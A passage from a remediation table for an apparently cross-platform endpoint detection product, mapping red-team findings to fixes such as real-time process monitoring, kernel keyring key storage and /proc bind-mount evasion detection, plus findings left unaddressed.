| RT-CP-2 (CRITICAL): All detection polling-based | Real-time cn_proc + fanotify on Linux | `LinuxProcessConnector.cs` - NETLINK_CONNECTOR for real-time fork/exec/exit (~1ms latency). `LinuxFanotifyMonitor.cs` - FAN_OPEN_EXEC for real-time file execution events. macOS remains polling (EndpointSecurity.framework requires notarization). |
| RT-CP-3 (HIGH): Key protection file-only | Linux kernel keyring integration | `KeyProtection.cs` - uses `add_key`/`request_key` syscalls to store machine key in kernel memory. Key never touches filesystem on Linux. Falls back to file-based in containers. |
| RT-CP-5 (HIGH): macOS persistence incomplete | Already implemented (confirmed) | `MacOSPersistenceMonitor.cs` covers LaunchDaemons, LaunchAgents, SecurityAgentPlugins, kexts, cron, periodic, login items with plist content analysis. |
| RT-CP-6 (MEDIUM): Network misses short-lived | Partially addressed via cn_proc | `LinuxProcessConnector` detects ephemeral processes (exec->exit <2s). Full network connection lifecycle tracking requires eBPF (future). |
| RT-CP-7 (MEDIUM): Response actions gaps | pidfd kill + nftables isolation | `ProcessKillAction.cs` - uses `pidfd_open`+`pidfd_send_signal` for race-free process kill on Linux 5.1+. `LinuxNetworkIsolation.cs` - nftables rules to isolate by UID or block C2 IPs. |
| RT-CP-8 (MEDIUM): No service unit files | Hardened systemd + launchd files shipped | `packaging/unix/behavedr.service` - full security directives (ProtectSystem=strict, capabilities, NoNewPrivileges). `packaging/unix/com.croatiasecurity.behavedr.plist` - KeepAlive, ThrottleInterval=1, resource limits. |
| RT-CP-9 (MEDIUM): Shell-out attack surface | Partial (absolute paths used) | All shell-outs already use absolute paths (/usr/sbin/lsof, /usr/sbin/sysctl). Full replacement with libproc P/Invoke is future work. |
| RT-CP-10 (MEDIUM): No update rollback | Staged update with .previous backup | `AutoUpdater.cs` - extracts to `.update-staging/`, backs up current to `.previous/`, then swaps. Failed updates can be rolled back. |
| RT-CP-11 (LOW): Beaconing uses wall clock | Fixed - monotonic clock | `BeaconingDetector.cs` - switched from `DateTime.UtcNow` to `Environment.TickCount64` for interval measurement. Immune to clock manipulation. |
| RT-CP-12 (LOW): fd monitoring no macOS | Fixed - libproc P/Invoke | `UnixSelfProtection.cs` - uses `proc_pidinfo(PROC_PIDLISTFDS)` via libproc.dylib for fd enumeration on macOS. |
| NEW: /proc bind mount evasion | Detection added | `LinuxMonitor.cs` - parses `/proc/mounts` to detect bind mounts over /proc paths (evasion technique). |

### Findings NOT addressed (require signing/kernel/notarization):

| Finding | Why not fixed | Alternative |
|---------|--------------|-------------|
| RT-CP-1: True kill prevention | Requires kernel module to intercept signals | Rapid restart (1s) + forensic logging of kill events |
| RT-CP-2: macOS real-time events | EndpointSecurity.framework requires Apple notarization | Polling at 5s intervals (existing) |
| RT-CP-4: Kernel-level visibility | Requires kernel module or signed eBPF (SecureBoot) | Userland symptom detection (/proc bind mounts, binary integrity) |
| RT-CP-9: Full lsof replacement | libproc P/Invoke for all network data is complex | Absolute paths + output validation |
